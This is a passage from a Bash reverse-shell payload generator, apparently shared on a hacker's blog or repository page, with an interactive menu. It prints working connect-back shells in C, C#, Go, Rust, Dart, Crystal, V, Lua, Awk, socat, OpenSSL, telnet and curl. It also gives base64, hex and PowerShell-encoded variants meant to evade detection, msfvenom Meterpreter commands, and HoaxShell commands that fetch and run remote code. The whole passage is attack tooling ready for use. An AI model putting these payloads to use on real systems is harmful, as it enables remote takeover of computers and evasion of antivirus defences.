CEOF
    print_note "Compile: gcc -o shell shell.c && ./shell"
    echo ""

    # ── C (Windows) ──
    print_multiline "C (Windows)" "windows" <<CEOF
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "${LHOST}";
char port[6] = "${LPORT}";
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main() {
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);
    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput =
        ini_processo.hStdError = (HANDLE)Winsock;
    TCHAR cmd[255] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL,
                  &ini_processo, &processo_info);
    return 0;
}
CEOF
    print_note "Compile: x86_64-w64-mingw32-gcc -o shell.exe shell.c -lws2_32"
    echo ""

    # ── C# TCP Client ──
    print_multiline "C# TCP Client" "linux, windows" <<CSEOF
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;

namespace ConnectBack {
    public class Program {
        static StreamWriter streamWriter;
        public static void Main(string[] args) {
            using(TcpClient client = new TcpClient("${LHOST}", ${LPORT})) {
                using(Stream stream = client.GetStream()) {
                    using(StreamReader rdr = new StreamReader(stream)) {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        Process p = new Process();
                        p.StartInfo.FileName = "${SHELL_BIN}";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += CmdOutputDataHandler;
                        p.Start();
                        p.BeginOutputReadLine();
                        while(true) {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
        private static void CmdOutputDataHandler(object s, DataReceivedEventArgs e) {
            if (!String.IsNullOrEmpty(e.Data)) {
                try {
                    streamWriter.WriteLine(e.Data);
                    streamWriter.Flush();
                } catch (Exception err) { }
            }
        }
    }
}
CSEOF

    # ── C# Bash -i ──
    print_multiline "C# Bash -i" "linux, windows" <<CSEOF
using System;
using System.Diagnostics;

namespace BackConnect {
    class ReverseBash {
        public static void Main(string[] args) {
            Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "${SHELL_BIN}";
            proc.StartInfo.Arguments =
                "-c \"${SHELL_BIN} -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\"";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            while (!proc.StandardOutput.EndOfStream) {
                Console.WriteLine(proc.StandardOutput.ReadLine());
            }
        }
    }
}
CSEOF

    # ── Golang ──
    print_payload "Golang" \
"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${LHOST}:${LPORT}\");cmd:=exec.Command(\"${SHELL_BIN}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go" \
"linux, mac"

    # ── Rust ──
    print_payload "rustcat" \
"rcat connect -s ${SHELL_BIN} ${LHOST} ${LPORT}" \
"linux, mac"

    print_multiline "Rust (source)" "linux, mac" <<RSEOF
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() {
    let stream = TcpStream::connect("${LHOST}:${LPORT}").unwrap();
    let mut child = Command::new("${SHELL_BIN}")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();
    // pipe stream <-> child stdio (see full impl)
}
RSEOF

    # ── Dart ──
    print_multiline "Dart" "linux, mac, windows" <<DARTEOF
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("${LHOST}", ${LPORT}).then((socket) {
    socket.listen((data) {
      Process.start('${SHELL_BIN}', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
DARTEOF

    # ── Crystal ──
    print_payload "Crystal (system)" \
"crystal eval 'require \"socket\"; s = TCPSocket.new(\"${LHOST}\", ${LPORT}); loop { cmd = s.gets; break unless cmd; s.puts IO.popen(cmd, &.read) rescue s.puts \"error\" }'" \
"linux, mac"

    print_multiline "Crystal (code)" "linux, mac" <<CREOF
require "socket"

s = TCPSocket.new("${LHOST}", ${LPORT})
while cmd = s.gets
  begin
    s.puts IO.popen(cmd, &.read)
  rescue e
    s.puts e.message
  end
end
s.close
CREOF

    # ── Vlang ──
    print_multiline "Vlang" "linux, mac" <<VEOF
import net
import os

fn main() {
    mut conn := net.dial_tcp('${LHOST}:${LPORT}') or { return }
    for {
        mut buf := []u8{len: 1024}
        n := conn.read(mut buf) or { break }
        if n == 0 { break }
        cmd := buf[..n].bytestr().trim_space()
        out := os.execute(cmd).output
        conn.write_string(out) or { break }
    }
    conn.close()
}
VEOF
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 11: OTHER LANGUAGES & TOOLS
# ═══════════════════════════════════════════════════════════════════════════

payload_other() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║   OTHER LANGUAGES & TOOLS            ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    # ── Socat ──
    print_payload "Socat #1" \
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}" \
"linux, mac"
    print_listener "socat file:\`tty\`,raw,echo=0 tcp-listen:${LPORT}"

    print_payload "Socat #2 (TTY)" \
"socat tcp-connect:${LHOST}:${LPORT} exec:${SHELL_BIN},pty,stderr,setsid,sigint,sane" \
"linux, mac"
    print_listener "socat -d -d file:\`tty\`,raw,echo=0 TCP-LISTEN:${LPORT}"

    # ── OpenSSL ──
    print_payload "OpenSSL (Encrypted)" \
"mkfifo /tmp/s; ${SHELL_BIN} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${LHOST}:${LPORT} > /tmp/s; rm /tmp/s" \
"linux, mac"
    print_note "Listener setup:"
    echo -e "  ${GREEN}openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes${NC}"
    echo -e "  ${GREEN}openssl s_server -quiet -key key.pem -cert cert.pem -port ${LPORT}${NC}"
    echo ""

    # ── Lua ──
    print_payload "Lua #1" \
"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${LHOST}','${LPORT}');os.execute('${SHELL_BIN} -i <&3 >&3 2>&3');\"" \
"linux, mac"

    print_payload "Lua #2" \
"lua5.1 -e 'local host,port = \"${LHOST}\",${LPORT};local socket = require(\"socket\");local tcp = socket.tcp();tcp:connect(host,port);while true do local cmd,status = tcp:receive();local f = io.popen(cmd,\"r\");local s = f:read(\"*a\");f:close();tcp:send(s);if status == \"closed\" then break end end;tcp:close()'" \
"linux, mac"

    # ── Awk ──
    print_payload "Awk" \
"awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" \
"linux, mac"

    # ── Telnet ──
    print_payload "Telnet #1" \
"rm -f /tmp/p; mknod /tmp/p p && telnet ${LHOST} ${LPORT} 0</tmp/p | ${SHELL_BIN} 1>/tmp/p" \
"linux, mac"

    print_payload "Telnet #2" \
"telnet ${LHOST} ${LPORT} | ${SHELL_BIN} | telnet ${LHOST} $((LPORT+1))" \
"linux, mac"
    print_note "Listener needs two ports: nc -lvnp ${LPORT} and nc -lvnp $((LPORT+1))"
    echo ""

    # ── Zsh ──
    print_payload "Zsh" \
"zsh -c 'zmodload zsh/net/tcp && ztcp ${LHOST} ${LPORT} && zsh -i >&\$REPLY 2>&\$REPLY 0>&\$REPLY'" \
"linux, mac"

    # ── sqlite3 ──
    print_payload "sqlite3 nc mkfifo" \
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELL_BIN} -i 2>&1|sqlite3 ${LHOST}:${LPORT} >/tmp/f" \
"linux, mac"
    print_note "Alternative: sqlite3 /dev/null '.shell ${SHELL_BIN} -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
    echo ""

    # ── curl ──
    print_payload "curl" \
"C='curl -Ns telnet://${LHOST}:${LPORT}'; \$C &1 | ${SHELL_BIN} 2>&1 | \$C >/dev/null" \
"linux, mac"

    # ── rustcat ──
    print_payload "rustcat" \
"rcat connect -s ${SHELL_BIN} ${LHOST} ${LPORT}" \
"linux, mac"

    # ── Haskell ──
    print_payload "Haskell #1" \
"runhaskell -e 'import System.Process; callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ${SHELL_BIN} -i 2>&1 | nc ${LHOST} ${LPORT} >/tmp/f\"'" \
"linux, mac"

    # ── Xterm ──
    print_payload "Xterm" \
"xterm -display ${LHOST}:${LPORT}" \
"linux, mac"
    print_note "Listener: xhost +targetip && nc -lvnp ${LPORT}"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 12: ENCODED VARIANTS
# ═══════════════════════════════════════════════════════════════════════════

payload_encoded() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║       ENCODED VARIANTS               ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    local bash_payload="${SHELL_BIN} -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"

    # Base64
    local b64
    b64=$(echo -n "$bash_payload" | base64 -w 0 2>/dev/null || echo -n "$bash_payload" | base64)
    print_payload "Base64 (decode & execute)" \
"echo '${b64}' | base64 -d | ${SHELL_BIN}"

    # URL-encoded
    local url_encoded
    if command -v python3 &>/dev/null; then
        url_encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${bash_payload}'))")
    else
        url_encoded="(python3 not found; URL-encode manually)"
    fi
    print_payload "URL-Encoded" "${url_encoded}"

    # Double URL-encoded
    local double_url
    if command -v python3 &>/dev/null; then
        double_url=$(python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('${bash_payload}')))")
    else
        double_url="(python3 not found; double URL-encode manually)"
    fi
    print_payload "Double URL-Encoded" "${double_url}"

    # Hex-encoded
    local hex_encoded
    hex_encoded=$(echo -n "$bash_payload" | xxd -p 2>/dev/null | tr -d '\n' || echo "(xxd not found)")
    print_payload "Hex-Encoded (decode & execute)" \
"echo '${hex_encoded}' | xxd -r -p | ${SHELL_BIN}"

    # PowerShell Base64 (UTF-16LE)
    local ps_payload="\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    local ps_b64
    ps_b64=$(echo -n "$ps_payload" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0 2>/dev/null || echo "ENCODE_MANUALLY")
    print_payload "PowerShell Base64 (UTF-16LE)" \
"powershell -nop -enc ${ps_b64}"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 13: MSFVENOM
# ═══════════════════════════════════════════════════════════════════════════

payload_msfvenom() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         MSFVENOM PAYLOADS            ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "Windows Meterpreter (staged, x86)" \
"msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe > shell.exe" \
"windows"

    print_payload "Windows Meterpreter (stageless, x64)" \
"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe > shell.exe" \
"windows"

    print_payload "Windows Shell (staged, x86)" \
"msfvenom -p windows/shell/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe > shell.exe" \
"windows"

    print_payload "Linux Meterpreter (staged, x64)" \
"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf > shell.elf" \
"linux"

    print_payload "Linux Meterpreter (stageless, x64)" \
"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf > shell.elf" \
"linux"

    print_payload "Linux Shell (staged, x86)" \
"msfvenom -p linux/x86/shell/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf > shell.elf" \
"linux"

    print_payload "MacOS Meterpreter (x64)" \
"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f macho > shell.macho" \
"mac"

    print_payload "PHP Meterpreter" \
"msfvenom -p php/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.php" \
"linux, windows, mac"

    print_payload "ASP Meterpreter" \
"msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f asp > shell.asp" \
"windows"

    print_payload "JSP Meterpreter" \
"msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.jsp" \
"linux, windows, mac"

    print_payload "WAR Meterpreter" \
"msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war > shell.war" \
"linux, windows, mac"

    print_payload "Python Meterpreter" \
"msfvenom -p python/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.py" \
"linux, mac"

    print_payload "Bash Meterpreter" \
"msfvenom -p cmd/unix/reverse_bash LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.sh" \
"linux, mac"

    print_payload "Perl Meterpreter" \
"msfvenom -p cmd/unix/reverse_perl LHOST=${LHOST} LPORT=${LPORT} -f raw > shell.pl" \
"linux, mac"

    print_note "Listener: msfconsole -q -x \"use multi/handler; set payload <payload>; set lhost ${LHOST}; set lport ${LPORT}; exploit\""
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 14: HOAXSHELL
# ═══════════════════════════════════════════════════════════════════════════

payload_hoaxshell() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         HOAXSHELL                    ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_note "HoaxShell generates a reverse shell via HTTP(S) traffic."
    print_note "It bypasses AV by using legitimate-looking HTTP requests."
    echo ""

    print_payload "HoaxShell (Windows, CMD)" \
"python3 -c \"\$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t cmd -p ${LPORT}" \
"windows"

    print_payload "HoaxShell (Windows, PowerShell)" \
"python3 -c \"\$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t ps -p ${LPORT}" \
"windows"

    print_payload "HoaxShell (Linux)" \
"python3 -c \"\$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t sh -p ${LPORT}" \
"linux"

    print_note "Repo: https://github.com/t3l3machus/hoaxshell"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 15: LISTENER COMMANDS  (all 17 from data.js listenerCommands)
# ═══════════════════════════════════════════════════════════════════════════

payload_listeners() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║       LISTENER COMMANDS              ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "nc" "nc -lvnp ${LPORT}"
    print_payload "nc (FreeBSD)" "nc -lvn ${LPORT}"
    print_payload "busybox nc" "busybox nc -lp ${LPORT}"
    print_payload "ncat" "ncat -lvnp ${LPORT}"
    print_payload "ncat.exe" "ncat.exe -lvnp ${LPORT}"
    print_payload "ncat (TLS)" "ncat --ssl -lvnp ${LPORT}"
    print_payload "rlwrap + nc" "rlwrap -cAr nc -lvnp ${LPORT}"
    print_payload "rustcat" "rcat listen ${LPORT}"
    print_payload "openssl" "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port ${LPORT}"
    print_payload "pwncat" "python3 -m pwncat -lp ${LPORT}"
    print_payload "pwncat (windows)" "python3 -m pwncat -m windows -lp ${LPORT}"
    print_payload "windows ConPty" "stty raw -echo; (stty size; cat) | nc -lvnp ${LPORT}"
    print_payload "socat" "socat -d -d TCP-LISTEN:${LPORT} STDOUT"
    print_payload "socat (TTY)" "socat -d -d file:\`tty\`,raw,echo=0 TCP-LISTEN:${LPORT}"
    print_payload "powercat" "powercat -l -p ${LPORT}"
    print_payload "msfconsole" "msfconsole -q -x \"use multi/handler; set payload <payload>; set lhost ${LHOST}; set lport ${LPORT}; exploit\""
    print_payload "hoaxshell" "python3 -c \"\$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t <type> -p ${LPORT}"
}

# ═══════════════════════════════════════════════════════════════════════════
#  SHOW ALL
# ═══════════════════════════════════════════════════════════════════════════

show_all() {
    payload_bash
    payload_netcat
    payload_python
    payload_perl
    payload_php
    payload_ruby
    payload_powershell
    payload_nodejs
    payload_java
    payload_compiled
    payload_other
    payload_encoded
    payload_msfvenom
    payload_hoaxshell
    payload_listeners
}

# ── Listener Reminder ───────────────────────────────────────────────────────
listener_reminder() {
    echo -e "${MAGENTA}${BOLD}══════════════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}${BOLD}  LISTENER REMINDER${NC}"
    echo -e "${MAGENTA}${BOLD}══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  Start your listener before deploying the payload:"
    echo ""
    echo -e "  ${GREEN}nc -lvnp ${LPORT}${NC}"
    echo -e "  ${GREEN}rlwrap nc -lvnp ${LPORT}${NC}  ${CYAN}(with readline support)${NC}"
    echo -e "  ${GREEN}pwncat-cs -l ${LPORT}${NC}      ${CYAN}(auto-upgrade to full TTY)${NC}"
    echo ""
    echo -e "  After catching the shell, upgrade it:"
    echo -e "  ${CYAN}See: https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md${NC}"
    echo ""
    echo -e "${MAGENTA}${BOLD}══════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ── Menu ────────────────────────────────────────────────────────────────────
show_menu() {
    echo -e "${BOLD}${WHITE}Select payload category:${NC}"
    echo ""
    echo -e "   ${CYAN}1)${NC}  Bash          ${DIM}(5 variants)${NC}"
    echo -e "   ${CYAN}2)${NC}  Netcat        ${DIM}(8 variants)${NC}"
    echo -e "   ${CYAN}3)${NC}  Python        ${DIM}(6 variants)${NC}"
    echo -e "   ${CYAN}4)${NC}  Perl          ${DIM}(3 variants)${NC}"
    echo -e "   ${CYAN}5)${NC}  PHP           ${DIM}(10 variants)${NC}"
    echo -e "   ${CYAN}6)${NC}  Ruby          ${DIM}(2 variants)${NC}"
    echo -e "   ${CYAN}7)${NC}  PowerShell    ${DIM}(7 variants)${NC}"
    echo -e "   ${CYAN}8)${NC}  Node.js / JS  ${DIM}(3 variants)${NC}"
    echo -e "   ${CYAN}9)${NC}  Java / Groovy ${DIM}(7 variants)${NC}"
    echo -e "  ${CYAN}10)${NC}  Compiled      ${DIM}(C, C#, Go, Rust, Dart, Crystal, V)${NC}"
    echo -e "  ${CYAN}11)${NC}  Other         ${DIM}(Lua, Awk, Telnet, Zsh, Socat, OpenSSL, etc.)${NC}"
    echo -e "  ${CYAN}12)${NC}  Encoded       ${DIM}(Base64, URL, Hex, PS-Base64)${NC}"
    echo -e "  ${CYAN}13)${NC}  MSFVenom      ${DIM}(14 payloads)${NC}"
    echo -e "  ${CYAN}14)${NC}  HoaxShell     ${DIM}(HTTP-based)${NC}"
    echo -e "  ${CYAN}15)${NC}  Listeners     ${DIM}(17 listener commands)${NC}"
    echo -e "  ${CYAN}16)${NC}  ${BOLD}Show ALL payloads${NC}"
    echo -e "   ${CYAN}0)${NC}  Exit"
    echo ""
    echo -ne "${CYAN}[>]${NC} Choice: "
}

# ── Main Loop ───────────────────────────────────────────────────────────────
while true; do
    show_menu
    read -r choice
    echo ""
    case $choice in
        1)  payload_bash ;;
        2)  payload_netcat ;;
        3)  payload_python ;;
        4)  payload_perl ;;
        5)  payload_php ;;
        6)  payload_ruby ;;
        7)  payload_powershell ;;
        8)  payload_nodejs ;;
        9)  payload_java ;;
        10) payload_compiled ;;
        11) payload_other ;;
        12) payload_encoded ;;
        13) payload_msfvenom ;;
        14) payload_hoaxshell ;;
        15) payload_listeners ;;
        16) show_all ;;
        0)
            echo -e "${GREEN}[+]${NC} Happy hacking! - Maat"
            echo ""
            exit 0
            ;;
        *)
            echo -e "${RED}[!]${NC} Invalid choice. Try again."
            echo ""
            ;;
    esac
    listener_reminder
done
```

<br/>

---

**Happy Hacking! 💻🏴‍☠️**

_Built with love by [Maat](https://github.com/Maat-Cyber)_

